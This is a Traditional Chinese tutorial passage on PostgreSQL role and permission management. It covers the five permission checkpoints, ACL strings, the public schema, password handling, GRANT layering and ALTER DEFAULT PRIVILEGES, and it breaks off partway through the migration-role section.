---
title: "PostgreSQL 角色與權限"
desc: "role 統一模型、五道權限關卡、public schema 風險、ALTER DEFAULT PRIVILEGES 與可交稽核的權限盤點"
aliases: [role, grant, revoke, schema, ACL, pg_hba, CREATE ROLE, ALTER DEFAULT PRIVILEGES, pg_read_all_data]
tags: [群組/軟體與開發工具, 服務/postgresql, 主題/權限]
category: 資料庫與資料儲存
difficulty: 進階
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[01-PostgreSQL-安裝與初始化]]", "[[03-psql-操作與常用指令]]", "[[02-MySQL-使用者與權限]]"]
updated: 2026-08-28
---

# PostgreSQL 角色與權限

> [!abstract] 這篇你會學到
> - **★★★★ 把「permission denied」精確定位到五道關卡的哪一道** —— `pg_hba` / `LOGIN` / 資料庫 `CONNECT` / schema `USAGE` / 物件權限，五種錯誤訊息長得不一樣，一眼分辨就少查兩小時
> - **★★★★ 用 `ALTER DEFAULT PRIVILEGES` 讓「明天 migration 新建的表」自動有正確權限** —— 不做這件事，`GRANT ... ON ALL TABLES` 只保佑今天存在的表，下次上版就 500
> - 看懂 `\dp` 那串 `app_rw=arwd/app_owner`，**一眼認出哪張表對 PUBLIC 開放**
> - 設計三層角色（owner / rw / ro 群組角色 + 登入角色），人員異動只改成員關係，不重打 GRANT
> - 搞懂 PostgreSQL 15 之後 `public` schema 的變化，以及升級上來的舊叢集為什麼**沒有**跟著變安全
> - 用 `pg_read_all_data`、`pg_monitor` 這些預定義角色，取代「乾脆給 SUPERUSER」
> - 用 `\password` 與 `~/.pgpass` **讓密碼不進 `psql_history`、不進伺服器日誌、不進 `ps`**
> - 產出可直接交稽核的權限盤點 CSV，並且**每次變更前都先存好回滾腳本**

## 前置知識

- [[01-PostgreSQL-安裝與初始化]] —— 已經有一台跑起來的 PostgreSQL 16/17，知道 `postgres` 這個作業系統帳號與 `postgres` 這個資料庫角色是兩回事
- [[03-psql-操作與常用指令]] —— 會用 `psql`、`\c`、`\dt`，本篇大量使用反斜線指令
- [[03-SQL基礎操作]] —— `SELECT` / `WHERE` / `JOIN` 語法本篇**不重講**，盤點查詢直接寫
- [[02-MySQL-使用者與權限]] —— 本篇會不斷跟 MySQL 對照；如果你是從 MySQL 過來的，先讀它會省很多力氣
- [[09-使用者與群組管理]] —— Linux 的 user / group；PostgreSQL 角色跟 OS 帳號**只有 `peer` 認證那一個接點**
- [[04-PostgreSQL-設定檔與pg_hba]] —— 第一道關卡在那一篇，本篇只負責第二道之後

---

## 觀念說明

### ★★★★ 五道關卡：先分清楚你卡在哪一道

MySQL 的權限問題幾乎都收斂到「`user@host` 比對錯了」。PostgreSQL 不一樣 —— 它把「誰可以連進來」跟「誰可以看到什麼」拆成兩套系統，中間又多了 schema 這一層。**一個連線要能讀到一張表，必須連過五道關卡，每道關卡失敗的訊息都不同。**

```text
  ①  pg_hba.conf 比對          FATAL:  no pg_hba.conf entry for host "10.0.1.25", user "app_hr", ...
      ↓ 通過                    ← 連 TCP 都還沒進到角色系統（見 04 篇，本篇不處理）
  ②  角色屬性 LOGIN            FATAL:  role "hr_rw" is not permitted to log in
      ↓ 通過                    ← 你把「群組角色」拿去當帳號用了
  ③  密碼／認證方式             FATAL:  password authentication failed for user "app_hr"
      ↓ 通過
  ④  資料庫 CONNECT            FATAL:  permission denied for database "hr_app"
      ↓ 通過                    DETAIL: User does not have CONNECT privilege.
  ⑤a schema USAGE              ERROR:  permission denied for schema app
      ↓ 通過                    ← ★★★★ 最常被漏掉的一層，MySQL 沒有這層
  ⑤b 物件權限 SELECT/INSERT…   ERROR:  permission denied for table orders
      ↓ 通過
  ⑥（若表上啟用了 RLS）         沒有錯誤訊息，SELECT 回傳【0 列】
                                ← ★★★★★ 最難查的一種：看起來一切正常，資料就是不見
      → 拿到資料
```

> [!danger] 這張圖漏掉的後果
> 半夜接到「網站看得到但資料是空的」，你花兩小時查 Laravel、查連線池、查快取，
> 最後發現是有人為了個資稽核在 `staff` 表上開了 RLS，而應用角色沒有對應 policy。
> **有錯誤訊息的問題都是好問題；④⑤是有訊息的，⑥沒有。**
> RLS 的完整處理在 [[08-PostgreSQL-安全強化]]，本篇只教你「怎麼確認它是不是元兇」。

### PostgreSQL 與 MySQL 的權限模型對照

★★★★ 從 MySQL 過來的人**一定**要先看完這張表，八成的困惑在這裡解掉：

| 面向 | MySQL 8 | PostgreSQL 16 / 17 | 星級 |
| --- | --- | --- | --- |
| 帳號怎麼識別 | `'user'@'host'`，**來源寫在帳號裡** | 只有一個 `rolname`，**來源限制寫在 `pg_hba.conf`** | ★★★★ |
| 使用者 vs 群組 | `USER` 與 `ROLE` 是兩種物件 | **統一成 role**，差別只在有沒有 `LOGIN` 屬性 | ★★★★ |
| 權限階層 | 全域 → 資料庫 → 表 → 欄 | 叢集 → 資料庫 → **schema** → 表 → 欄 → 參數 | ★★★★ |
| 跨資料庫查詢 | 同一連線可 `db1.t JOIN db2.t` | **做不到**，一個連線只綁一個資料庫 | ★★★★ |
| 新建的表會不會自動有權限 | 給了 `ON db.*` 就涵蓋未來的表 | **不會**，必須 `ALTER DEFAULT PRIVILEGES` | ★★★★★ |
| 預設對外開放的東西 | 舊版殘存的匿名帳號 | `PUBLIC` 隱含群組：資料庫 `CONNECT`+`TEMPORARY`、函式 `EXECUTE` | ★★★★ |
| 權限存在哪 | `mysql.user` / `mysql.db` 等系統表 | 物件自己的 `aclitem[]` 欄（`relacl`、`nspacl`、`datacl`） | ★★★ |
| 要不要 flush | 直接改系統表才要 `FLUSH PRIVILEGES` | 不需要，`GRANT` commit 後立即生效 | ★★★ |
| 帳號鎖定 | `ACCOUNT LOCK` | 沒有對應語法，用 `NOLOGIN` 或 `VALID UNTIL` 代替 | ★★★ |
| 資源限制 | `MAX_QUERIES_PER_HOUR` | `CONNECTION LIMIT` + `ALTER ROLE ... SET statement_timeout` | ★★★ |
| 誰是最高權限 | `root` 帳號 + `GRANT OPTION` | `SUPERUSER` 屬性（**繞過所有權限檢查，含 RLS**） | ★★★★★ |

### ★★★★ 角色是叢集層級，權限是資料庫層級

這一條分不清楚，後面所有腳本都會寫錯：

```text
  ┌──────────────────── PostgreSQL 叢集（一個 data directory）────────────────────┐
  │                                                                              │
  │   pg_authid / pg_roles          ← 角色本身、密碼、LOGIN/SUPERUSER 等屬性       │
  │   pg_auth_members               ← 誰屬於誰（群組關係）                         │
  │        ★★★★ 這兩張是【全叢集共用】，在哪個資料庫裡建都一樣                     │
  │                                                                              │
  │   ┌── 資料庫 hr_app ─────────┐   ┌── 資料庫 acc_app ────────┐                │
  │   │  pg_namespace.nspacl     │   │  pg_namespace.nspacl     │                │
  │   │  pg_class.relacl         │   │  pg_class.relacl         │                │
  │   │  pg_default_acl          │   │  pg_default_acl          │                │
  │   │  ★★★★ 這些是【各庫獨立】 │   │  ★★★★ 這些是【各庫獨立】 │                │
  │   └──────────────────────────┘   └──────────────────────────┘                │
  └──────────────────────────────────────────────────────────────────────────────┘

  結論：
    CREATE ROLE app_hr ...            → 在任一資料庫執行一次就夠
    GRANT SELECT ON ... TO app_hr;    → ★★★★ 必須【連到那個資料庫】才有效
    ALTER DEFAULT PRIVILEGES ...      → ★★★★ 也是每個資料庫各做一次
```

實務上這代表：你在 `psql -d postgres` 裡把權限授一輪，然後應用連 `hr_app` 還是 permission denied —— **你剛剛授權的是 `postgres` 這個資料庫裡的物件**。

### 角色的兩種用法：群組角色與登入角色

PostgreSQL 沒有 `CREATE USER` 與 `CREATE ROLE` 的本質差別（`CREATE USER` 只是 `CREATE ROLE ... LOGIN` 的別名）。實務上我們**自己**把角色分成兩種用途：

```text
  【群組角色】NOLOGIN，只拿來裝權限
      hr_owner   ← 擁有 schema 與所有表（DDL 用）
      hr_rw      ← SELECT/INSERT/UPDATE/DELETE
      hr_ro      ← 只有 SELECT

  【登入角色】LOGIN + 密碼，給人或程式用，本身【不直接持有權限】
      app_hr  ──成員──▶ hr_rw     Laravel / Nuxt 應用
      rpt_hr  ──成員──▶ hr_ro     報表與統計
      mig_hr  ──成員──▶ hr_owner  資料庫 migration（平常不啟用，見下）
      bak_hr  ──成員──▶ pg_read_all_data   邏輯備份

  ★★★★ 好處：廠商換人、應用拆分、加一個唯讀查詢帳號，
        都只是「加一個登入角色、掛進既有群組」，不用重打一次 GRANT，
        也不會出現「A 帳號有的權限 B 帳號少一個」這種對不起來的狀況。
```

### INHERIT 與 SET ROLE：權限是自動生效還是要手動切換

```text
  GRANT hr_rw TO app_hr;                    -- 預設 WITH INHERIT TRUE, SET TRUE
    → app_hr 一連上來就【自動擁有】hr_rw 的權限

  GRANT hr_owner TO mig_hr WITH INHERIT FALSE, SET TRUE;   -- PG16 起可逐條指定
    → mig_hr 平常【沒有】hr_owner 的權限（想 DROP TABLE 也 DROP 不掉）
    → 要動 DDL 時才 SET ROLE hr_owner;  ★★★★ 這就是「臨時提權」
    → 離開 session 或 RESET ROLE; 就自動降回去
```

> [!note] PostgreSQL 16 對 `CREATEROLE` 動的手術
> PG16 之前，一個有 `CREATEROLE` 的角色幾乎可以改動任何非 superuser 角色（包含改密碼），
> 這是很多「以為是低權限管理帳號、其實等同半個 superuser」的來源。
> PG16 起：
> - 修改別的角色（含加成員）需要對那個角色有 **ADMIN OPTION**
> - `CREATEROLE` 角色**建出來的新角色會自動 grant 回給建立者**（`WITH ADMIN TRUE, SET FALSE, INHERIT FALSE`）
> - 新的 `createrole_self_grant` 參數控制建立者要不要順便繼承或能 `SET ROLE` 過去
>
> ★★★ 如果你的腳本是在 PG13/14 時代寫的，升到 16 之後很可能出現
> `ERROR:  must have admin option on role "xxx"`。這不是 bug，是刻意收緊。

### 讀懂 ACL 字串：`app_rw=arwd/app_owner`

`\dp` 與 `pg_class.relacl` 顯示的就是這串。**看不懂它，你就無法盤點權限。**

```text
     app_owner=arwdDxtm/app_owner
     ├───┬───┘ └──┬───┘ └───┬────┘
     │            │         └─ 授權者（grantor）：這個權限是誰給的
     │            └─────────── 權限字母
     └──────────────────────── 被授權者（grantee）

  ★★★★ 被授權者是【空字串】代表 PUBLIC：
        "=r/app_owner"  ← 全世界（任何能連進這個資料庫的角色）都能 SELECT

  ★★★★ 整個 Access privileges 欄位【空白】不代表「沒人有權限」，
        代表「還是出廠預設」——擁有者全權、其他人無。
        一旦你下了第一個 GRANT，PostgreSQL 才會把完整 ACL 展開寫進去。
```

權限字母對照（PG17 完整版）：

| 字母 | 權限 | 適用物件 | 星級 |
| --- | --- | --- | --- |
| `r` | SELECT（read） | 表、序列、大物件、欄位 | ★★★ |
| `a` | INSERT（append） | 表、欄位 | ★★★ |
| `w` | UPDATE（write） | 表、序列、欄位 | ★★★ |
| `d` | DELETE | 表 | ★★★ |
| `D` | TRUNCATE | 表 | ★★★★ |
| `x` | REFERENCES | 表、欄位 | ★★ |
| `t` | TRIGGER | 表 | ★★★ |
| `m` | MAINTAIN（VACUUM/ANALYZE/REINDEX…） | 表，**PostgreSQL 17 起才有** | ★★ |
| `C` | CREATE | 資料庫、schema、tablespace | ★★★★ |
| `c` | CONNECT | 資料庫 | ★★★★ |
| `T` | TEMPORARY | 資料庫 | ★★★ |
| `X` | EXECUTE | 函式、程序 | ★★★ |
| `U` | USAGE | **schema**、序列、語言、型別 | ★★★★ |
| `s` | SET | 組態參數 | ★★ |
| `A` | ALTER SYSTEM | 組態參數 | ★★★★ |

`arwdDxtm` 就是「表的全部權限」，也就是 `GRANT ALL ON TABLE`（PG16 以前是 `arwdDxt`，沒有 `m`）。

### PUBLIC：那個你沒建過、卻什麼都有一點的角色

★★★★ `PUBLIC` 不是一個真的角色，是「所有角色」的簡寫。**新建資料庫預設就對它開放三件事**：

| 物件 | PUBLIC 預設拿到 | 後果 | 星級 |
| --- | --- | --- | --- |
| 資料庫 | `CONNECT` + `TEMPORARY`（`Tc`） | **任何登入角色都連得進你的每一個資料庫** | ★★★★ |
| 函式 / 程序 | `EXECUTE`（`X`） | 自訂函式（含 `SECURITY DEFINER`）人人可呼叫 | ★★★★ |
| 語言、型別、domain | `USAGE`（`U`） | 影響小 | ★ |
| schema | **無** | PG15 起 `public` schema 的 `CREATE` 也收回了 | ★★★ |

所以「最小權限」的第一步從來不是 `GRANT`，是 **`REVOKE`**：

```sql
REVOKE ALL ON DATABASE hr_app FROM PUBLIC;
GRANT  CONNECT ON DATABASE hr_app TO app_hr, rpt_hr, bak_hr;
```

### PostgreSQL 15 的 public schema 變更，以及升級上來為什麼沒變安全

PG15 起，新建資料庫的 `public` schema：擁有者改成 `pg_database_owner`，並且**從 `PUBLIC` 收回 `CREATE`**。這是為了 CVE-2018-1058（`search_path` 物件遮蔽攻擊）。

```text
  PG14 以前的 public schema：   =UC/postgres        ← 任何人都能在裡面建表 ★★★★★
  PG15 以後（新建的資料庫）：    =U/pg_database_owner ← 只剩 USAGE，不能建表

  ★★★★ 但是！用 pg_dump / pg_upgrade 從舊版升上來的資料庫，
        ACL 是照抄的 —— 你升到 16 了，public schema 還是 =UC，
        跟升級前一樣不安全，而且沒有任何警告。
```

升級後的補救（每個資料庫各做一次）：

```sql
ALTER SCHEMA public OWNER TO pg_database_owner;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
```

> [!note] 本篇的界線
> - **`pg_hba.conf` 的比對順序、`peer` / `trust` / `scram-sha-256` 差異**：在 [[04-PostgreSQL-設定檔與pg_hba]]，那是第一道關卡
> - **RLS（列級安全）、`ssl` 強制、稽核日誌方案**：在 [[08-PostgreSQL-安全強化]]
> - **`bak_hr` 角色實際怎麼跑備份與 PITR**：在 [[05-PostgreSQL-備份與還原]]
> - **複寫角色 `REPLICATION` 屬性怎麼接上 standby**：在 [[07-PostgreSQL-複寫與高可用]]
> - **`SELECT` / `JOIN` 語法本身**：在 [[03-SQL基礎操作]]，本篇的盤點查詢不再解釋語法

---

## 基礎操作

以下全部以 **Ubuntu 24.04 + PostgreSQL 16**（PGDG 套件庫也可裝 17）為主線。RHEL 系差異在各段落的摺疊 callout。

### 先看清楚現況：角色盤點的第一組指令

```bash
sudo -u postgres psql -c '\du'
```

預期輸出：

```text
                             List of roles
 Role name |                         Attributes
-----------+------------------------------------------------------------
 app_hr    |
 hr_owner  | Cannot login
 hr_rw     | Cannot login
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS
```

> [!warning] ★★★ PostgreSQL 16 起 `\du` 不再有 "Member of" 欄位
> 舊教學（PG15 以前）會叫你看 `\du` 的第三欄找群組關係 —— 16 之後那一欄被移除了。
> 現在要看成員關係請用 **`\drg`**，而且它多顯示了 `ADMIN` / `INHERIT` / `SET` 三個選項：
> ```text
> postgres=# \drg
>          List of role grants
>  Role name | Member of | Options | Grantor
> -----------+-----------+---------+----------
>  app_hr    | hr_rw     | INHERIT | postgres
>  mig_hr    | hr_owner  | SET     | postgres      ← ★★★★ 沒有 INHERIT，要 SET ROLE 才生效
> ```

要看得更細（屬性一次全出來）就直接查系統目錄：

```bash
sudo -u postgres psql -c "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication, rolbypassrls, rolconnlimit, rolvaliduntil FROM pg_roles WHERE rolname NOT LIKE 'pg\_%' ORDER BY 1;"
```

預期輸出：

```text
 rolname  | rolsuper | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication | rolbypassrls | rolconnlimit |     rolvaliduntil
----------+----------+---------------+-------------+-------------+----------------+--------------+--------------+------------------------
 app_hr   | f        | f             | f           | t           | f              | f            |           20 | 2026-12-31 00:00:00+08
 bak_hr   | f        | f             | f           | t           | f              | f            |            2 |
 hr_owner | f        | f             | f           | f           | f              | f            |           -1 |
 postgres | t        | t             | t           | t           | t              | t            |           -1 |
```

★★★★ 這份輸出的四個紅旗，盤點時逐欄掃過去：

| 欄位 | 看到什麼要警覺 | 星級 |
| --- | --- | --- |
| `rolsuper = t` | 除了 `postgres` 之外還有第二個 superuser | ★★★★★ |
| `rolbypassrls = t` | 這個角色**看得到 RLS 想遮掉的所有列**（個資） | ★★★★★ |
| `rolcreaterole = t` | 可以自己造帳號，等於後門製造機 | ★★★★ |
| `rolconnlimit = -1` | 無連線上限，一支跑掉的報表就能吃光 `max_connections` | ★★★ |

### 診斷神器：`current_user` 與 `session_user`

★★★★ 跟 MySQL 的 `USER()` / `CURRENT_USER()` 對應，**遇到權限問題的第一條指令**：

```bash
psql "host=127.0.0.1 dbname=hr_app user=app_hr" -c "SELECT session_user, current_user, current_database(), current_schemas(true);"
```

預期輸出：

```text
 session_user | current_user | current_database |   current_schemas
--------------+--------------+------------------+---------------------
 app_hr       | app_hr       | hr_app           | {pg_catalog,app,public}
```

怎麼解讀：

- `session_user` = **你登入時用的角色**，`SET ROLE` 不會改變它（稽核追人就看這欄）
- `current_user` = **目前生效的角色**，`SET ROLE hr_owner` 之後會變成 `hr_owner`
- `current_schemas(true)` = ★★★★ **實際的 search_path 展開結果**。少了 `app`，你的 `SELECT * FROM orders` 就會回 `relation "orders" does not exist` —— 那不是權限問題，是 search_path 問題，兩者的錯誤訊息完全不同，別搞混

### 建立角色：`CREATE ROLE` 與那些會咬人的屬性

```sql
-- 群組角色：只裝權限，不能登入
CREATE ROLE hr_owner NOLOGIN;
CREATE ROLE hr_rw    NOLOGIN;
CREATE ROLE hr_ro    NOLOGIN;

-- 登入角色：★★★★ 注意這裡【不要】直接寫明文密碼，理由見下一節
CREATE ROLE app_hr LOGIN
  CONNECTION LIMIT 20                       -- ★★★ 一支失控的應用不會吃光 max_connections
  VALID UNTIL '2026-12-31';                 -- ★★★ 密碼到期日，機關的定期換發用得上
GRANT hr_rw TO app_hr;                      -- 預設 INHERIT，登入即生效
```

驗證：

```bash
sudo -u postgres psql -c '\drg app_hr'
```

```text
        List of role grants
 Role name | Member of | Options | Grantor
-----------+-----------+---------+----------
 app_hr    | hr_rw     | INHERIT | postgres
```

角色屬性的風險等級（**寫進去之前先看這張表**）：

| 屬性 | 作用 | 給出去的後果 | 星級 |
| --- | --- | --- | --- |
| `SUPERUSER` | 繞過**所有**權限檢查，含 RLS 與物件擁有者 | 等同給了整台機器；還能 `COPY ... PROGRAM` 執行 OS 指令 | ★★★★★ |
| `BYPASSRLS` | 無視所有 RLS policy | 個資遮蔽全部失效，且**不會有任何錯誤訊息** | ★★★★★ |
| `CREATEDB` | 可建資料庫 | 可用磁碟塞爆機器 | ★★★ |
| `CREATEROLE` | 可建／改角色 | PG16 後收緊了，但仍能造帳號 | ★★★★ |
| `REPLICATION` | 可開複寫連線 | ★★★★ **等於可以整份複製資料庫出去**，見 [[07-PostgreSQL-複寫與高可用]] | ★★★★★ |
| `LOGIN` | 可作為連線身分 | 群組角色**不要**給 | ★★★★ |
| `INHERIT` / `NOINHERIT` | 是否自動繼承成員權限 | `NOINHERIT` 是臨時提權的基礎 | ★★★ |
| `CONNECTION LIMIT n` | 連線上限 | `-1` 為無限 | ★★★ |
| `VALID UNTIL 'ts'` | **密碼**的有效期限 | ★★★ 注意：只擋密碼認證，**不擋 `peer` / `trust` / 憑證認證** | ★★★★ |

> [!warning] ★★★★ `VALID UNTIL` 不是「帳號停用」
> 它只讓**密碼**失效。如果 `pg_hba.conf` 裡那條規則是 `peer` 或 `trust`，
> 過期的帳號照樣連得進來。真正的停用是 `ALTER ROLE app_hr NOLOGIN;`。
> 這一點跟 MySQL 的 `ACCOUNT LOCK` 不同，很多人照搬 MySQL 的做法就踩到。

### ★★★★ 密碼：不要打在 `CREATE ROLE` 裡

`CREATE ROLE app_hr LOGIN PASSWORD 'S3cret!';` 這一行的明文密碼會出現在**三個地方**：

```text
  1. ~/.psql_history          ← 你自己的家目錄，644 是常態
  2. 伺服器日誌               ← 只要 log_statement = 'ddl' 或 'all' 就會整句記下來
                                 /var/log/postgresql/postgresql-16-main.log
  3. ps -ef 的輸出            ← 如果你是用 psql -c "..." 執行的
```

★★★★ **正解是 `psql` 的 `\password` 元指令** —— 它在**用戶端**算好 SCRAM 驗證子，送到伺服器的已經是雜湊值：

```bash
sudo -u postgres psql -c '\password app_hr'
```

```text
Enter new password for user "app_hr":
Enter it again:
```

驗證伺服器端存的確實是雜湊而非明文：

```bash
sudo -u postgres psql -Atc "SELECT rolname, left(rolpassword, 22) FROM pg_authid WHERE rolname='app_hr';"
```

```text
app_hr|SCRAM-SHA-256$4096:8Xq
```

看到 `SCRAM-SHA-256$4096:` 開頭就對了。★★★★ 若看到 `md5` 開頭，代表 `password_encryption` 被設成 `md5`（PG14 起預設已是 `scram-sha-256`），請到 [[04-PostgreSQL-設定檔與pg_hba]] 修正後**重設每一個角色的密碼**（改參數不會自動轉換既有雜湊）。

非互動的腳本無法用 `\password`，退而求其次的寫法（實戰範例那一節會完整用上）：

```sql
-- ★★★★ 先關掉本 session 的語句紀錄，密碼才不會進日誌
SET log_statement = 'none';
SET log_min_duration_statement = -1;
ALTER ROLE app_hr PASSWORD 'pFyO...';
RESET log_statement;
```

用戶端這邊，密碼放 `~/.pgpass`：

```bash
umask 077
printf '127.0.0.1:5432:hr_app:app_hr:pFyO...\n' >> ~/.pgpass
chmod 600 ~/.pgpass
stat -c '%a %n' ~/.pgpass
```

```text
600 /root/.pgpass
```

★★★★ 權限不是 `0600`（或更嚴）時，libpq **會直接忽略整個檔案**且只在部分情境給警告，你會得到一個莫名其妙的 `password authentication failed`。

> [!danger] 不要用 `PGPASSWORD` 環境變數
> `PGPASSWORD=xxx psql ...` 會讓密碼進入 `/proc/<pid>/environ`（同機器上有權限的人讀得到）、
> 被子程序繼承、並且留在 shell history。官方文件明列為不建議做法。
> 排程用 `~/.pgpass` 或 `~/.pg_service.conf`，兩者都要 `chmod 600`。

### GRANT 階梯：從資料庫一路授到欄位

★★★ 順序很重要，**由外往內**，跳過任何一層下一層都白給：

```sql
-- 【第 1 層】資料庫：先關門，再開給指定角色
REVOKE ALL ON DATABASE hr_app FROM PUBLIC;
GRANT  CONNECT ON DATABASE hr_app TO app_hr, rpt_hr;

-- 【第 2 層】schema：★★★★ MySQL 沒有這層，最常被漏掉
\c hr_app
GRANT USAGE ON SCHEMA app TO hr_rw, hr_ro;

-- 【第 3 層】表：ON ALL TABLES 只涵蓋【現在存在】的表
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES    IN SCHEMA app TO hr_rw;
GRANT SELECT                         ON ALL TABLES    IN SCHEMA app TO hr_ro;

-- 【第 4 層】序列：★★★★ Laravel 的 $table->id() 產生的是 bigserial，
--            少了這行，INSERT 會噴 permission denied for sequence xxx_id_seq
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA app TO hr_rw;

-- 【第 5 層】欄位：個資最小揭露
GRANT SELECT (id, name, dept, hire_date) ON app.staff TO hr_ro;
```

驗證 —— **不要用 `postgres` 測，要用該角色本人測**：

```bash
psql "host=127.0.0.1 dbname=hr_app user=rpt_hr" -c "SELECT id, name FROM app.staff LIMIT 1;"
```

```text
 id |  name
----+--------
  1 | 王小明
```

```bash
psql "host=127.0.0.1 dbname=hr_app user=rpt_hr" -c "SELECT id_no FROM app.staff LIMIT 1;"
```

```text
ERROR:  permission denied for table staff
```

★★★★ 注意這裡的訊息是 `permission denied for table staff`，**不是** `for column id_no`。PostgreSQL 的欄位層授權被擋時只說「表」，這會誤導你去查表層權限。用 `\dp` 看清楚：

```bash
sudo -u postgres psql -d hr_app -c '\dp app.staff'
```

```text
                                Access privileges
 Schema | Name  | Type  |    Access privileges     |   Column privileges
--------+-------+-------+--------------------------+------------------------
 app    | staff | table | hr_owner=arwdDxt/hr_owner+| id:        +
        |       |       | hr_rw=arwd/hr_owner      |   hr_ro=r/hr_owner    +
        |       |       |                          | name:      +
        |       |       |                          |   hr_ro=r/hr_owner
```

**Column privileges 那一欄**才是欄位層授權的真相。

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> 角色與權限的 SQL **完全一樣**（那是 SQL 標準，不是發行版差異）。不同的是外圍：
> ```bash
> # 套件與初始化（PGDG 套件庫）
> sudo dnf -qy module disable postgresql
> sudo dnf install -y postgresql16-server postgresql16-contrib
> sudo /usr/pgsql-16/bin/postgresql-16-setup initdb
> sudo systemctl enable --now postgresql-16
> ```
> ★★★★ 三個路徑差異，腳本裡千萬別寫死 Ubuntu 的路徑：
>
> | 項目 | Ubuntu / Debian | Rocky / AlmaLinux |
> | --- | --- | --- |
> | 資料目錄 | `/var/lib/postgresql/16/main` | `/var/lib/pgsql/16/data` |
> | 設定檔 | `/etc/postgresql/16/main/postgresql.conf` | `/var/lib/pgsql/16/data/postgresql.conf` |
> | `pg_hba.conf` | `/etc/postgresql/16/main/pg_hba.conf` | `/var/lib/pgsql/16/data/pg_hba.conf` |
> | 服務名 | `postgresql@16-main` | `postgresql-16` |
> | 執行檔 | 在 `PATH` 裡（`pg_wrapper`） | `/usr/pgsql-16/bin/`，**不在預設 PATH** |
> | 預設 `pg_hba` 本機規則 | `local all postgres peer` | ★★★★ 舊版可能是 `ident`／`trust`，**先檢查再動作** |
>
> ★★★ RHEL 系另有 SELinux：資料目錄搬家要 `semanage fcontext -a -t postgresql_db_t`，
> 否則 `initdb` 或啟動會失敗，而錯誤訊息看起來像權限問題但其實是 SELinux。

### 動手做一次：證明「schema USAGE」是獨立的一關

★★★★ 這個實驗做過一次，以後看到 `permission denied for schema` 就不會再去改表權限。

```bash
sudo -u postgres psql -d hr_app <<'SQL'
CREATE ROLE lab_ro LOGIN PASSWORD 'Lab-Only-2026';
GRANT CONNECT ON DATABASE hr_app TO lab_ro;
GRANT SELECT ON app.staff TO lab_ro;      -- 只給表，故意不給 schema
SQL
```

```bash
PGPASSFILE=/dev/null psql "host=127.0.0.1 dbname=hr_app user=lab_ro password=Lab-Only-2026" \
  -c "SELECT count(*) FROM app.staff;"
```

```text
ERROR:  permission denied for schema app
LINE 1: SELECT count(*) FROM app.staff;
                             ^
```

表權限明明給了，還是被擋。補上 schema：

```bash
sudo -u postgres psql -d hr_app -c "GRANT USAGE ON SCHEMA app TO lab_ro;"
```

```text
GRANT
```

再試一次：

```text
 count
-------
   142
```

收尾（★★★ `DROP ROLE` 之前一定要先解掉相依，理由見排錯段）：

```bash
sudo -u postgres psql -d hr_app -c "DROP OWNED BY lab_ro;"
sudo -u postgres psql -c "DROP ROLE lab_ro;"
```

---

## 進階應用

### ★★★★★ `ALTER DEFAULT PRIVILEGES`：本篇最重要的一節

**症狀**：權限都設好了，跑一次 `php artisan migrate` 新增一張表，隔天應用就 500。

**原因**：`GRANT ... ON ALL TABLES IN SCHEMA app` 是**一次性快照**，它把當下存在的每一張表逐一授權，對明天才建的表毫無作用。MySQL 的 `GRANT ... ON db.*` 是「規則」，PostgreSQL 的 `ON ALL TABLES` 是「批次動作」—— **這是兩套系統最大的心智落差**。

正解：

```sql
-- ★★★★ FOR ROLE 必須是【實際建立物件的那個角色】
ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO hr_rw;

ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
  GRANT SELECT ON TABLES TO hr_ro;

ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
  GRANT USAGE, SELECT ON SEQUENCES TO hr_rw;

ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
  GRANT SELECT ON SEQUENCES TO hr_ro;

-- ★★★ 順手把函式對 PUBLIC 的預設 EXECUTE 收掉
ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
  REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC;
```

檢查有沒有生效：

```bash
sudo -u postgres psql -d hr_app -c '\ddp'
```

預期輸出：

```text
            Default access privileges
  Owner   | Schema |   Type   |     Access privileges
----------+--------+----------+---------------------------
 hr_owner | app    | sequence | hr_ro=r/hr_owner         +
          |        |          | hr_rw=rU/hr_owner
 hr_owner | app    | table    | hr_ro=r/hr_owner         +
          |        |          | hr_rw=arwd/hr_owner
```

★★★★★ **四個最常見的失敗點，逐條對照你的環境：**

| 陷阱 | 為什麼會壞 | 怎麼確認 |
| --- | --- | --- |
| **`FOR ROLE` 寫錯人** | 預設權限只對「該角色**自己**建立的物件」生效。migration 若是用 `mig_hr` 連線、又沒有 `SET ROLE hr_owner`，物件擁有者就是 `mig_hr`，`FOR ROLE hr_owner` 完全不會觸發 | 新表建完 `\dt app.*` 看 Owner 欄 |
| **只做了一個資料庫** | `pg_default_acl` 是**每個資料庫獨立**的 | 每個庫各跑一次 `\ddp` |
| **忘了 SEQUENCES** | Laravel `$table->id()` → `bigserial` → INSERT 需要序列 `USAGE` | `INSERT` 測試，看有沒有 `permission denied for sequence` |
| **以為它會回頭修好舊表** | 它**只管未來**，既有的表要另外補一次 `ON ALL TABLES` | `\dp app.*` 逐張看 |

★★★★ 所以完整的做法**永遠是兩句一組**：一句補既有物件，一句管未來物件。

```sql
GRANT SELECT ON ALL TABLES IN SCHEMA app TO hr_ro;                      -- 現在
ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
  GRANT SELECT ON TABLES TO hr_ro;                                      -- 未來
```

### ★★★★ 讓 migration 一定用對擁有者：`SET ROLE` 或 `ALTER ROLE ... SET role`

既然預設權限綁在「建立者」身上，就要保證 DDL 一律由 `hr_owner` 建。兩種做法：

```sql
-- 做法 A：連線角色一連上就自動切換（Laravel / Nuxt 不用改任何程式碼）
ALTER ROLE mig_hr IN DATABASE hr_app SET role = 'hr_owner';

-- 做法 B：migration 腳本自己切（比較明確，但要記得寫）
SET ROLE hr_owner;
CREATE TABLE app.audit_log (...);
RESET ROLE;
```

驗證做法 A：

```bash
psql "host=127.0.0.1 dbname=hr_app user=mig_hr" -c "SELECT session_user, current_user;"
```

```text
